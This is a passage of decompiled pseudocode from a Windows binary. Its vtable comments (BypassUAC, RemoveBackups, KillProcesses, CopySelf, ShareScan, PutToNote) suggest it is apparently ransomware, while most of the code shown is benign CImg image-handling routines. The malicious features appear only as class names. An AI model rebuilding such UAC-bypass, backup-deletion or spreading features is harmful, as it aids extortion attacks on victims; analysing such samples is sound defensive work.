        v11 = *(void **)(*(_DWORD *)WideCharStr - 4);
        v12 = HIDWORD(v60) + 36;
        if ( (unsigned int)(*(_DWORD *)WideCharStr - (_DWORD)v11 - 4) > 0x1F )
          goto LABEL_85;
      }
      v55 = v12;
      sub_44775B(v11);
    }
    LOBYTE(v130) = 9;
    v60 = 0xF00000000i64;
    LOBYTE(WideCharStr[0]) = 0;
    if ( v69 < 8 )
      goto LABEL_25;
    v13 = v64;
    v14 = 2 * v69 + 2;
    if ( v14 < 0x1000
      || (v13 = (void *)*((_DWORD *)v64 - 1), v14 = 2 * v69 + 37,
                                              (unsigned int)((_BYTE *)v64 - (_BYTE *)v13 - 4) <= 0x1F) )
    {
      v55 = v14;
      sub_44775B(v13);
LABEL_25:
      LOBYTE(v130) = 8;
      if ( v91 >= 0x10 )
      {
        v15 = v90[0];
        v16 = v91 + 1;
        if ( v91 + 1 >= 0x1000 )
        {
          v15 = (void *)*((_DWORD *)v90[0] - 1);
          v16 = v91 + 36;
          if ( (unsigned int)(v90[0] - v15 - 4) > 0x1F )
            goto LABEL_86;
        }
        v55 = v16;
        sub_44775B(v15);
      }
      LOBYTE(v130) = 7;
      v122 = &ANEventGetID::`vftable';
      if ( v129 < 0x10 )
      {
LABEL_33:
        v1 = v62;
        goto LABEL_34;
      }
      v17 = v126[0];
      v18 = v129 + 1;
      if ( v129 + 1 < 0x1000
        || (v17 = (void *)*((_DWORD *)v126[0] - 1), v18 = v129 + 36, (unsigned int)(v126[0] - v17 - 4) <= 0x1F) )
      {
        v55 = v18;
        sub_44775B(v17);
        goto LABEL_33;
      }
LABEL_86:
      _invalid_parameter_noinfo_noreturn();
    }
LABEL_85:
    _invalid_parameter_noinfo_noreturn();
  }
  return sub_41B120(v70);
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B165C: using guessed type void *ANEventGetNoteName::`vftable';
// 4B1680: using guessed type void *ANEventScanFileSystemAsync::`vftable';
// 4B1788: using guessed type void *ANEventBypassUAC::`vftable';
// 4B1790: using guessed type void *ANEventEnableLinkedConnections::`vftable';
// 4B1798: using guessed type void *ANEventKillProcesses::`vftable';
// 4B17A0: using guessed type void *ANEventShareScan::`vftable';
// 4B17A8: using guessed type void *ANEventGetProcesses::`vftable';
// 4B17B0: using guessed type void *ANEventGetPublicKey::`vftable';
// 4B17C8: using guessed type void *ANEventStopServices::`vftable';
// 4B17D8: using guessed type void *ANEventInitFileProcess::`vftable';
// 4B18F4: using guessed type void *ANEventGetID::`vftable';
// 4B18FC: using guessed type void *ANEventPutToNote::`vftable';
// 4B1904: using guessed type void *ANEventDisableUAC::`vftable';
// 4B1910: using guessed type void *ANEventGetInterval::`vftable';
// 4B1924: using guessed type void *ANEventDriveScan::`vftable';
// 4B192C: using guessed type void *ANEventRemoveBackups::`vftable';
// 4B1934: using guessed type void *ANEventScanWhiteListAsync::`vftable';
// 4B193C: using guessed type void *ANEventGetServices::`vftable';
// 4B1960: using guessed type void *ANEventAddToAutorun::`vftable';
// 4B19D8: using guessed type void *ANEventRemoveServices::`vftable';
// 4B19E0: using guessed type void *ANEventIsRunning::`vftable';
// 4B19E8: using guessed type void *ANEventCopySelf::`vftable';
// 4B1A08: using guessed type void *ANEventHiddenDevicesScan::`vftable';
// 420D70: using guessed type int var_1E8[6];
// 420D70: using guessed type _DWORD var_6C[3];

//----- (00421C40) --------------------------------------------------------
void __thiscall sub_421C40(_DWORD *this)
{
  char *v1; // eax
  char *v2; // esi

  v1 = (char *)this[2];
  if ( v1 )
  {
    v2 = v1 - 4;
    `eh vector destructor iterator'(v1, 0x18u, *((_DWORD *)v1 - 1), (void (__thiscall *)(void *))sub_421DE0);
    sub_447DEF(v2);
  }
}

//----- (00421CB0) --------------------------------------------------------
_BYTE *__thiscall sub_421CB0(_BYTE *this, unsigned int a2, int a3, int a4, int a5)
{
  int v6; // eax
  _DWORD v8[14]; // [esp+0h] [ebp-38h] BYREF

  v8[10] = v8;
  v8[9] = this;
  this[16] = 0;
  if ( a2 )
  {
    *(_DWORD *)this = a2;
    *((_DWORD *)this + 1) = 1;
    *((_DWORD *)this + 2) = 1;
    *((_DWORD *)this + 3) = 1;
    v8[13] = 0;
    v6 = unknown_libname_86((unsigned __int64)a2 >> 31 != 0 ? -1 : 2 * a2);
  }
  else
  {
    *((_DWORD *)this + 3) = 0;
    v6 = 0;
    *((_DWORD *)this + 2) = 0;
    *((_DWORD *)this + 1) = 0;
    *(_DWORD *)this = 0;
  }
  *((_DWORD *)this + 5) = v6;
  return this;
}
// 41C430: using guessed type _DWORD __cdecl sub_41C430(_DWORD, _DWORD, _DWORD);
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00421DE0) --------------------------------------------------------
void __thiscall sub_421DE0(void **this)
{
  if ( !*((_BYTE *)this + 16) )
    j_j__free(this[5]);
}

//----- (00421DF0) --------------------------------------------------------
_BYTE *__thiscall sub_421DF0(_BYTE *this, unsigned int a2, int a3, int a4, int a5)
{
  int v6; // eax
  _DWORD v8[13]; // [esp+0h] [ebp-34h] BYREF

  v8[9] = v8;
  v8[8] = this;
  this[16] = 0;
  if ( a2 )
  {
    *(_DWORD *)this = a2;
    *((_DWORD *)this + 1) = 1;
    *((_DWORD *)this + 2) = 1;
    *((_DWORD *)this + 3) = 1;
    v8[12] = 0;
    v6 = unknown_libname_86((unsigned __int64)a2 >> 30 != 0 ? -1 : 4 * a2);
  }
  else
  {
    *((_DWORD *)this + 3) = 0;
    v6 = 0;
    *((_DWORD *)this + 2) = 0;
    *((_DWORD *)this + 1) = 0;
    *(_DWORD *)this = 0;
  }
  *((_DWORD *)this + 5) = v6;
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00421F20) --------------------------------------------------------
_BYTE *__thiscall sub_421F20(_BYTE *this, int a2, int a3, int a4, int a5)
{
  int v6; // eax
  int v7; // eax
  _DWORD v9[14]; // [esp+0h] [ebp-38h] BYREF

  v9[10] = v9;
  v9[9] = this;
  this[16] = 0;
  v6 = a5 * a4 * a3 * a2;
  if ( v6 )
  {
    *(_DWORD *)this = a2;
    *((_DWORD *)this + 1) = a3;
    *((_DWORD *)this + 2) = a4;
    *((_DWORD *)this + 3) = a5;
    v9[13] = 0;
    v7 = unknown_libname_86(v6);
  }
  else
  {
    *((_DWORD *)this + 3) = 0;
    v7 = 0;
    *((_DWORD *)this + 2) = 0;
    *((_DWORD *)this + 1) = 0;
    *(_DWORD *)this = 0;
  }
  *((_DWORD *)this + 5) = v7;
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00422060) --------------------------------------------------------
int __thiscall sub_422060(int this, int a2, int a3, int a4, int a5)
{
  int v6; // ecx
  int v7; // edx
  int v8; // edi
  bool v9; // zf
  void *v10; // eax
  int v11; // eax
  int v13; // [esp+0h] [ebp-58h] BYREF
  char v14[16]; // [esp+20h] [ebp-38h] BYREF
  int v15; // [esp+30h] [ebp-28h]
  int v16; // [esp+34h] [ebp-24h]
  int v17; // [esp+38h] [ebp-20h]
  int v18; // [esp+3Ch] [ebp-1Ch]
  void *v19; // [esp+40h] [ebp-18h]
  int v20; // [esp+44h] [ebp-14h]
  int *v21; // [esp+48h] [ebp-10h]
  int v22; // [esp+54h] [ebp-4h]

  v21 = &v13;
  v20 = this;
  v6 = a3;
  v7 = a4;
  v8 = a5 * a4 * a3 * a2;
  if ( v8 )
  {
    v18 = *(_DWORD *)(this + 12);
    v17 = *(_DWORD *)(this + 8);
    v16 = *(_DWORD *)(this + 4);
    v15 = *(_DWORD *)this;
    if ( v8 != *(_DWORD *)(this + 12) * *(_DWORD *)(this + 8) * *(_DWORD *)(this + 4) * v15 )
    {
      v9 = *(_BYTE *)(this + 16) == 0;
      v10 = *(void **)(this + 20);
      v19 = v10;
      if ( !v9 )
      {
        sub_422AD0();
        sub_41C2D0(
          (int)v14,
          (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::assign(): Invalid assignment request of shared instance fro"
               "m specified image (%u,%u,%u,%u).",
          v15);
        _CxxThrowException(v14, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
      }
      j_j__free(v10);
      v22 = 0;
      v11 = unknown_libname_86(v8);
      v6 = a3;
      v7 = a4;
      *(_DWORD *)(this + 20) = v11;
    }
    *(_DWORD *)this = a2;
    *(_DWORD *)(this + 4) = v6;
    *(_DWORD *)(this + 8) = v7;
    *(_DWORD *)(this + 12) = a5;
  }
  else
  {
    if ( !*(_BYTE *)(this + 16) )
      j_j__free(*(void **)(this + 20));
    *(_DWORD *)(this + 12) = 0;
    *(_DWORD *)(this + 8) = 0;
    *(_DWORD *)(this + 4) = 0;
    *(_DWORD *)this = 0;
    *(_BYTE *)(this + 16) = 0;
    *(_DWORD *)(this + 20) = 0;
  }
  return this;
}
// 41C430: using guessed type _DWORD __cdecl sub_41C430(_DWORD, _DWORD, _DWORD);
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00422230) --------------------------------------------------------
_DWORD *__thiscall sub_422230(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // esi
  char v9; // bl
  int v10; // edi
  _DWORD *result; // eax
  int v12; // [esp+14h] [ebp+8h]
  int v13; // [esp+18h] [ebp+Ch]

  v13 = a2;
  if ( a2 && a3 )
  {
    v8 = 1;
    v9 = 1;
    v10 = 1;
    v12 = 1;
  }
  else
  {
    v9 = 0;
    v8 = 0;
    v13 = 0;
    v10 = 0;
    v12 = 0;
    a3 = 0;
  }
  *this = a3;
  this[1] = v12;
  result = this;
  this[2] = v10;
  this[3] = v8;
  *((_BYTE *)this + 16) = v9;
  this[5] = v13;
  return result;
}

//----- (00422290) --------------------------------------------------------
_BYTE *__thiscall sub_422290(_BYTE *this, int a2, int a3, int a4, int a5)
{
  int v6; // eax
  _DWORD v8[14]; // [esp+0h] [ebp-38h] BYREF

  v8[10] = v8;
  v8[9] = this;
  this[16] = 0;
  if ( a2 )
  {
    *(_DWORD *)this = a2;
    *((_DWORD *)this + 1) = 1;
    *((_DWORD *)this + 2) = 1;
    *((_DWORD *)this + 3) = 1;
    v8[13] = 0;
    v6 = unknown_libname_86(a2);
  }
  else
  {
    *((_DWORD *)this + 3) = 0;
    v6 = 0;
    *((_DWORD *)this + 2) = 0;
    *((_DWORD *)this + 1) = 0;
    *(_DWORD *)this = 0;
  }
  *((_DWORD *)this + 5) = v6;
  return this;
}
// 41C430: using guessed type _DWORD __cdecl sub_41C430(_DWORD, _DWORD, _DWORD);
// 41EF70: using guessed type _DWORD __cdecl sub_41EF70(_DWORD, _DWORD);
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (004223B0) --------------------------------------------------------
void __thiscall sub_4223B0(_DWORD *this)
{
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  this[3] = 0;
  *((_BYTE *)this + 16) = 0;
  this[5] = 0;
}

//----- (004223E0) --------------------------------------------------------
char *__thiscall sub_4223E0(char *this, int a2)
{
  sub_41C1B0(this, a2);
  *(_DWORD *)this = &cimg_library::CImgInstanceException::`vftable';
  return this;
}
// 4B1918: using guessed type void *cimg_library::CImgInstanceException::`vftable';

//----- (00422490) --------------------------------------------------------
const char *sub_422490()
{
  return "unknown16";
}

//----- (004224A0) --------------------------------------------------------
const char *sub_4224A0()
{
  return "unsigned int";
}

//----- (004224B0) --------------------------------------------------------
int __fastcall sub_4224B0(int *a1, int a2, int a3, int a4)
{
  int v4; // edi
  int v5; // ebx
  bool v6; // cc
  FILE *v7; // ebx
  int v8; // eax
  char *v9; // esi
  int v10; // ecx
  unsigned int v11; // edx
  int v12; // edx
  int v13; // ecx
  unsigned __int8 *v14; // esi
  unsigned int v15; // eax
  unsigned __int8 *v16; // edi
  unsigned __int8 *v17; // edx
  unsigned int v18; // eax
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  unsigned __int8 v24; // al
  int v25; // edi
  int v26; // eax
  int v28; // [esp+0h] [ebp-54h]
  char v29[8]; // [esp+10h] [ebp-44h] BYREF
  char pExceptionObject[12]; // [esp+18h] [ebp-3Ch] BYREF
  void *Block; // [esp+24h] [ebp-30h]
  const char *v32; // [esp+28h] [ebp-2Ch]
  unsigned __int8 v33; // [esp+2Fh] [ebp-25h] BYREF
  int v34; // [esp+30h] [ebp-24h]
  int v35; // [esp+34h] [ebp-20h]
  int *v36; // [esp+38h] [ebp-1Ch]
  unsigned __int8 *v37; // [esp+3Ch] [ebp-18h]
  int v38[5]; // [esp+40h] [ebp-14h] BYREF

  v4 = (int)a1;
  v36 = a1;
  if ( !a4 )
  {
    sub_41C6D0();
    sub_41C2D0(
      (int)pExceptionObject,
      (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::save_bmp(): Specified filename is (null).",
      *(_DWORD *)v4);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
  }
  if ( !a1[5] || (v5 = *a1) == 0 || !a1[1] || !a1[2] || (a1 = (int *)a1[3]) == 0 )
  {
    sub_41CA20((int)a1, a4);
    return v4;
  }
  v6 = *(_DWORD *)(v4 + 8) <= 1u;
  v32 = "non-";
  if ( !v6 )
  {
    sub_41C800(
      (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::save_bmp(): Instance is volumetric, only the first slice will b"
           "e saved in file '%s'.",
      v5);
    a1 = *(int **)(v4 + 12);
    v5 = *(_DWORD *)v4;
  }
  if ( (unsigned int)a1 > 3 )
    sub_41C800(
      (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::save_bmp(): Instance is multispectral, only the three first cha"
           "nnels will be saved in file '%s'.",
      v5);
  v7 = sub_41C910(a4);
  v33 = 0;
  sub_422F00(v29, 54, 1, 1, 1, &v33);
  v38[4] = 0;
  v8 = *(_DWORD *)v4;
  v9 = (char *)Block;
  v10 = *(_DWORD *)v4;
  v38[0] = 0;
  v32 = (const char *)(v10 & 3);
  v11 = *(_DWORD *)(v4 + 4) * (_DWORD)&v32[2 * v8 + v8];
  *(_WORD *)Block = 19778;
  *((_WORD *)v9 + 1) = v11 + 54;
  v9[4] = (v11 + 54) >> 16;
  v9[5] = (v11 + 54) >> 24;
  v9[10] = 54;
  v9[14] = 40;
  v9[18] = *(_BYTE *)v4;
  v9[19] = *(_BYTE *)(v4 + 1);
  v9[20] = *(_BYTE *)(v4 + 2);
  v9[21] = *(_BYTE *)(v4 + 3);
  v9[22] = *(_BYTE *)(v4 + 4);
  v9[23] = *(_BYTE *)(v4 + 5);
  v9[24] = *(_BYTE *)(v4 + 6);
  v9[25] = *(_BYTE *)(v4 + 7);
  *(_DWORD *)(v9 + 26) = 1572865;
  *(_DWORD *)(v9 + 34) = v11;
  v9[39] = 1;
  v9[43] = 1;
  sub_42BAE0((int)v9, 0x36u, v7);
  v12 = *(_DWORD *)(v4 + 4);
  v13 = *(_DWORD *)v4;
  v37 = *(unsigned __int8 **)(v4 + 20);
  v35 = v12;
  v14 = &v37[v13 * (v12 - 1)];
  v15 = *(_DWORD *)(v4 + 12);
  v34 = v15;
  if ( v15 < 2 )
  {
    v16 = 0;
    goto LABEL_15;
  }
  v16 = &v37[v13 * (v12 * (*(_DWORD *)(v4 + 8) + 1) - 1)];
  if ( v15 < 3 )
  {
LABEL_15:
    v17 = 0;
    goto LABEL_16;
  }
  v15 = v34;
  v17 = &v37[v13 * (v35 * (2 * v36[2] + 1) - 1)];
LABEL_16:
  v37 = v17;
  v18 = v15 - 1;
  if ( v18 )
  {
    if ( v18 == 1 )
    {
      v37 = 0;
      if ( v35 > 0 )
      {
        do
        {
          v34 = 0;
          if ( v13 > 0 )
          {
            do
            {
              fputc(0, v7);
              v22 = *v16++;
              fputc(v22, v7);
              v23 = *v14++;
              fputc(v23, v7);
              ++v34;
            }
            while ( v34 < *v36 );
          }
          sub_42BAE0((int)v38, (unsigned int)v32, v7);
          v35 = *v36;
          v14 -= 2 * v35;
          v16 -= 2 * v35;
          v6 = (int)(v37 + 1) < v36[1];
          v13 = v35;
          ++v37;
        }
        while ( v6 );
      }
    }
    else
    {
      v34 = 0;
      if ( v35 > 0 )
      {
        do
        {
          v35 = 0;
          if ( v13 > 0 )
          {
            do
            {
              v19 = *v17;
              v37 = v17 + 1;
              fputc(v19, v7);
              v20 = *v16++;
              fputc(v20, v7);
              v21 = *v14++;
              fputc(v21, v7);
              v17 = v37;
              ++v35;
            }
            while ( v35 < *v36 );
          }
          sub_42BAE0((int)v38, (unsigned int)v32, v7);
          v35 = *v36;
          v17 = &v37[-2 * v35];
          v14 -= 2 * v35;
          v16 -= 2 * v35;
          v37 = v17;
          v6 = v34 + 1 < v36[1];
          v13 = v35;
          ++v34;
        }
        while ( v6 );
      }
    }
    v4 = (int)v36;
  }
  else
  {
    v4 = (int)v36;
    v37 = 0;
    if ( v35 > 0 )
    {
      do
      {
        v34 = 0;
        if ( v13 > 0 )
        {
          do
          {
            v24 = *v14++;
            v25 = v24;
            fputc(v24, v7);
            fputc(v25, v7);
            fputc(v25, v7);
            v4 = (int)v36;
            ++v34;
          }
          while ( v34 < *v36 );
        }
        sub_42BAE0((int)v38, (unsigned int)v32, v7);
        v13 = *(_DWORD *)v4;
        v14 -= 2 * *(_DWORD *)v4;
        ++v37;
      }
      while ( (int)v37 < *(_DWORD *)(v4 + 4) );
    }
  }
  if ( v7 )
  {
    if ( v7 != __acrt_iob_func(0) && v7 != __acrt_iob_func(1u) )
    {
      v26 = fclose(v7);
      if ( v26 )
        sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v26);
    }
  }
  else
  {
    sub_41C800((int)"cimg::fclose(): Specified file is (null).", v28);
  }
  if ( !pExceptionObject[8] )
    j_j__free(Block);
  return v4;
}
// 42276C: variable 'v28' is possibly undefined
// 4224B0: using guessed type char var_44[8];

//----- (00422930) --------------------------------------------------------
int __thiscall sub_422930(_DWORD *this, int a2, int a3, int a4, int a5)
{
  return a2 + this[5] + *this * (a3 + this[1] * (a4 + a5 * this[2]));
}

//----- (00422960) --------------------------------------------------------
_DWORD *__thiscall sub_422960(_DWORD *this, int a2)
{
  size_t v3; // ebx
  char v4; // al
  void *v5; // eax
  _DWORD v7[15]; // [esp+0h] [ebp-3Ch] BYREF

  v7[11] = v7;
  v7[9] = this;
  v3 = *(_DWORD *)(a2 + 12) * *(_DWORD *)(a2 + 8) * *(_DWORD *)a2 * *(_DWORD *)(a2 + 4);
  if ( *(_DWORD *)(a2 + 20) && v3 )
  {
    *this = *(_DWORD *)a2;
    this[1] = *(_DWORD *)(a2 + 4);
    this[2] = *(_DWORD *)(a2 + 8);
    this[3] = *(_DWORD *)(a2 + 12);
    v4 = *(_BYTE *)(a2 + 16);
    *((_BYTE *)this + 16) = v4;
    if ( v4 )
    {
      this[5] = *(_DWORD *)(a2 + 20);
    }
    else
    {
      v7[14] = 0;
      v5 = (void *)unknown_libname_86(v3);
      this[5] = v5;
      memmove(v5, *(const void **)(a2 + 20), v3);
    }
  }
  else
  {
    this[3] = 0;
    this[2] = 0;
    this[1] = 0;
    *this = 0;
    *((_BYTE *)this + 16) = 0;
    this[5] = 0;
  }
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00422AD0) --------------------------------------------------------
const char *sub_422AD0()
{
  return "char";
}

//----- (00422AE0) --------------------------------------------------------
_DWORD *__thiscall sub_422AE0(_DWORD *this, int a2)
{
  size_t v3; // ebx
  char v4; // al
  void *v5; // eax
  _DWORD v7[13]; // [esp+0h] [ebp-34h] BYREF

  v7[9] = v7;
  v7[8] = this;
  v3 = *(_DWORD *)(a2 + 12) * *(_DWORD *)(a2 + 8) * *(_DWORD *)a2 * *(_DWORD *)(a2 + 4);
  if ( *(_DWORD *)(a2 + 20) && v3 )
  {
    *this = *(_DWORD *)a2;
    this[1] = *(_DWORD *)(a2 + 4);
    this[2] = *(_DWORD *)(a2 + 8);
    this[3] = *(_DWORD *)(a2 + 12);
    v4 = *(_BYTE *)(a2 + 16);
    *((_BYTE *)this + 16) = v4;
    if ( v4 )
    {
      this[5] = *(_DWORD *)(a2 + 20);
    }
    else
    {
      v7[12] = 0;
      v5 = (void *)unknown_libname_86(v3);
      this[5] = v5;
      memmove(v5, *(const void **)(a2 + 20), v3);
    }
  }
  else
  {
    this[3] = 0;
    this[2] = 0;
    this[1] = 0;
    *this = 0;
    *((_BYTE *)this + 16) = 0;
    this[5] = 0;
  }
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00422C50) --------------------------------------------------------
_DWORD *__userpurge sub_422C50@<eax>(int *a1@<ecx>, float a2@<xmm3>, int a3, int a4)
{
  _DWORD *v4; // edi
  _DWORD *v5; // edx
  int v6; // eax
  unsigned int v7; // ecx
  unsigned int v8; // esi
  unsigned int v9; // ebx
  char *v10; // edi
  int *v11; // eax
  int v12; // ecx
  int v13; // edx
  int v14; // esi
  int v15; // eax
  int *v16; // edx
  int v17; // eax
  size_t v18; // ecx
  int v19; // esi
  const void *v20; // edx
  size_t *v21; // esi
  float v22; // xmm0_4
  float v23; // xmm0_4
  int v25; // [esp-8h] [ebp-64h]
  unsigned int v27; // [esp+20h] [ebp-3Ch]
  unsigned int v28; // [esp+24h] [ebp-38h]
  size_t v29; // [esp+28h] [ebp-34h]
  int v30; // [esp+2Ch] [ebp-30h]
  int v31; // [esp+2Ch] [ebp-30h]
  void *v32; // [esp+30h] [ebp-2Ch]
  void *v33; // [esp+30h] [ebp-2Ch]
  char *v34; // [esp+30h] [ebp-2Ch]
  signed int v35; // [esp+34h] [ebp-28h] BYREF
  int v36; // [esp+38h] [ebp-24h]
  int v37; // [esp+3Ch] [ebp-20h]
  int v38; // [esp+40h] [ebp-1Ch]
  char v39; // [esp+44h] [ebp-18h]
  void *Block; // [esp+48h] [ebp-14h]
  int v41; // [esp+58h] [ebp-4h]

  v4 = (_DWORD *)a3;
  v5 = (_DWORD *)a1[2];
  if ( v5 && (v6 = *a1, (v30 = *a1) != 0) )
  {
    if ( v6 == 1 )
    {
      sub_4237A0((_DWORD *)a3, (int)v5, (int)a1);
    }
    else
    {
      v7 = 0;
      v32 = 0;
      v8 = 0;
      v27 = 0;
      v9 = 0;
      v28 = 0;
      v29 = 0;
      v35 = 0;
      v36 = 0;
      v37 = 0;
      v38 = 0;
      v39 = 0;
      Block = 0;
      v41 = 0;
      if ( v6 > 0 )
      {
        v10 = 0;
        do
        {
          if ( v5[5] )
          {
            v10 += *v5;
            v6 = v30;
            if ( v9 < v5[1] )
              v9 = v5[1];
            if ( v7 < v5[2] )
              v7 = v5[2];
            if ( v8 < v5[3] )
              v8 = v5[3];
          }
          v5 += 6;
          v30 = --v6;
        }
        while ( v6 );
        v32 = v10;
        v4 = (_DWORD *)a3;
        v28 = v8;
        v27 = v7;
      }
      v11 = (int *)sub_422060((int)&v35, (int)v32, v9, v7, v8);
      v33 = (void *)v11[5];
      if ( v33 )
      {
        v12 = *v11;
        if ( *v11 )
        {
          v13 = v11[1];
          if ( v13 )
          {
            v14 = v11[2];
            if ( v14 )
            {
              v15 = v11[3];
              if ( v15 )
                memset(v33, 0, v12 * v13 * v14 * v15);
            }
          }
        }
      }
      if ( Block )
      {
        v16 = a1;
        v34 = 0;
        if ( *a1 > 0 )
        {
          v17 = 0;
          v31 = 0;
          v18 = 0;
          do
          {
            v19 = v16[2];
            v20 = *(const void **)(v19 + v17 + 20);
            v21 = (size_t *)(v17 + v19);
            if ( v20 )
            {
              if ( v21[1] == 1 && v21[2] == 1 && v21[3] == 1 && v36 == 1 && v37 == 1 && v38 == 1 )
              {
                memmove((char *)Block + v18, v20, *v21);
              }
              else
              {
                v22 = (float)(v28 - v21[3]);
                v25 = (int)(float)(v22 * a2);
                v23 = (float)(v27 - v21[2]);
                sub_4230E0(
                  &v35,
                  v18,
                  (int)(float)((float)(v9 - v21[1]) * a2),
                  (int)(float)(v23 * a2),
                  v25,
                  (int *)v21,
                  1.0);
              }
              v18 = v29;
              v17 = v31;
            }
            v18 += *v21;
            v17 += 24;
            v16 = a1;
            v29 = v18;
            ++v34;
            v31 = v17;
          }
          while ( (int)v34 < *a1 );
          v4 = (_DWORD *)a3;
        }
      }
      sub_422AE0(v4, (int)&v35);
      if ( !v39 )
        j_j__free(Block);
    }
  }
  else
  {
    *(_DWORD *)a3 = 0;
    *(_DWORD *)(a3 + 4) = 0;
    *(_DWORD *)(a3 + 8) = 0;
    *(_DWORD *)(a3 + 12) = 0;
    *(_BYTE *)(a3 + 16) = 0;
    *(_DWORD *)(a3 + 20) = 0;
  }
  return v4;
}

//----- (00422EF0) --------------------------------------------------------
int __thiscall sub_422EF0(_DWORD *this)
{
  return this[1];
}

//----- (00422F00) --------------------------------------------------------
_BYTE *__thiscall sub_422F00(_BYTE *this, int a2, int a3, int a4, int a5, unsigned __int8 *a6)
{
  int v7; // eax
  void *v8; // ecx
  int v9; // ebx
  int v10; // edi
  int v11; // eax
  _DWORD v13[13]; // [esp+0h] [ebp-34h] BYREF

  v13[9] = v13;
  v13[8] = this;
  this[16] = 0;
  v7 = a5 * a4 * a3 * a2;
  if ( v7 )
  {
    *(_DWORD *)this = a2;
    *((_DWORD *)this + 1) = a3;
    *((_DWORD *)this + 2) = a4;
    *((_DWORD *)this + 3) = a5;
    v13[12] = 0;
    v8 = (void *)unknown_libname_86(v7);
    *((_DWORD *)this + 5) = v8;
    if ( v8 )
    {
      if ( *(_DWORD *)this )
      {
        v9 = *((_DWORD *)this + 1);
        if ( v9 )
        {
          v10 = *((_DWORD *)this + 2);
          if ( v10 )
          {
            v11 = *((_DWORD *)this + 3);
            if ( v11 )
              memset(v8, *a6, *(_DWORD *)this * v9 * v10 * v11);
          }
        }
      }
    }
  }
  else
  {
    *((_DWORD *)this + 3) = 0;
    *((_DWORD *)this + 2) = 0;
    *((_DWORD *)this + 1) = 0;
    *(_DWORD *)this = 0;
    *((_DWORD *)this + 5) = 0;
  }
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00423080) --------------------------------------------------------
int *__thiscall sub_423080(int *this, unsigned __int8 *a2)
{
  void *v3; // edx
  int v4; // ecx
  int v5; // eax

  v3 = (void *)this[5];
  if ( v3 )
  {
    v4 = *this;
    if ( *this )
    {
      if ( this[1] )
      {
        if ( this[2] )
        {
          v5 = this[3];
          if ( v5 )
            memset(v3, *a2, v4 * this[1] * this[2] * v5);
        }
      }
    }
  }
  return this;
}

//----- (004230D0) --------------------------------------------------------
const char *sub_4230D0()
{
  return "float";
}

//----- (004230E0) --------------------------------------------------------
int __thiscall sub_4230E0(signed int *this, size_t a2, int a3, int a4, int a5, int *a6, float a7)
{
  bool v8; // zf
  signed int v9; // ecx
  signed int v10; // edx
  int v11; // eax
  int v12; // eax
  int v13; // ecx
  unsigned int v14; // edi
  int v15; // esi
  int v17; // eax
  signed int v18; // edx
  __m128 v19; // xmm3
  size_t v20; // esi
  int v21; // edi
  int v22; // edi
  int v23; // esi
  size_t v24; // eax
  signed __int32 v25; // edi
  unsigned __int32 v26; // eax
  signed int v27; // edx
  int v28; // eax
  signed int v29; // edx
  int v30; // eax
  int v31; // edi
  int v32; // edx
  unsigned __int32 v33; // xmm0_4
  int *v34; // esi
  int v35; // xmm2_4
  int v36; // ecx
  int v37; // eax
  int v38; // edi
  char *v39; // ecx
  char *v40; // edx
  size_t v41; // esi
  int v42; // eax
  float v43; // xmm1_4
  _DWORD v44[4]; // [esp+14h] [ebp-64h] BYREF
  char v45; // [esp+24h] [ebp-54h]
  void *Block; // [esp+28h] [ebp-50h]
  int v47; // [esp+2Ch] [ebp-4Ch]
  size_t v48; // [esp+30h] [ebp-48h]
  int v49; // [esp+34h] [ebp-44h]
  int v50; // [esp+38h] [ebp-40h]
  int v51; // [esp+3Ch] [ebp-3Ch]
  int v52; // [esp+40h] [ebp-38h]
  int *v53; // [esp+44h] [ebp-34h]
  int v54; // [esp+48h] [ebp-30h]
  int v55; // [esp+4Ch] [ebp-2Ch]
  int v56; // [esp+50h] [ebp-28h]
  int v57; // [esp+54h] [ebp-24h]
  int v58; // [esp+58h] [ebp-20h]
  int v59; // [esp+5Ch] [ebp-1Ch]
  unsigned __int32 v60; // [esp+60h] [ebp-18h]
  int v61; // [esp+64h] [ebp-14h]
  size_t Size; // [esp+68h] [ebp-10h]
  int v63; // [esp+74h] [ebp-4h]

  v8 = this[5] == 0;
  v59 = a5;
  Size = a2;
  v60 = a3;
  v61 = a4;
  v53 = a6;
  if ( v8 )
    return (int)this;
  v9 = *this;
  if ( !*this )
    return (int)this;
  v10 = this[1];
  if ( !v10 || !this[2] || !this[3] || !a6[5] )
    return (int)this;
  v11 = this[2] * this[3];
  v54 = a6[3];
  v12 = v9 * v10 * v11;
  v57 = a6[2];
  v58 = a6[1];
  v13 = *a6;
  v14 = this[5];
  if ( v14 + v12 <= a6[5] || v14 >= v54 * v57 * v58 * *a6 + a6[5] )
  {
    v17 = v60;
    v18 = *this;
    if ( Size || v60 || v61 || v59 != v60 || v18 != v13 || this[1] != v58 )
    {
      v19 = (__m128)LODWORD(a7);
    }
    else
    {
      v19 = (__m128)LODWORD(a7);
      if ( this[2] == v57 )
      {
        v17 = v60;
        if ( this[3] == v54 && a7 >= 1.0 && !*((_BYTE *)this + 16) )
          return sub_42B990((int)this, v53, 0);
      }
    }
    v20 = Size;
    v55 = 0;
    if ( (Size & 0x80000000) != 0 )
      v20 = 0;
    v21 = v17;
    v48 = v20;
    if ( v17 < 0 )
      v21 = v55;
    v52 = v21;
    v22 = v61;
    v55 = 0;
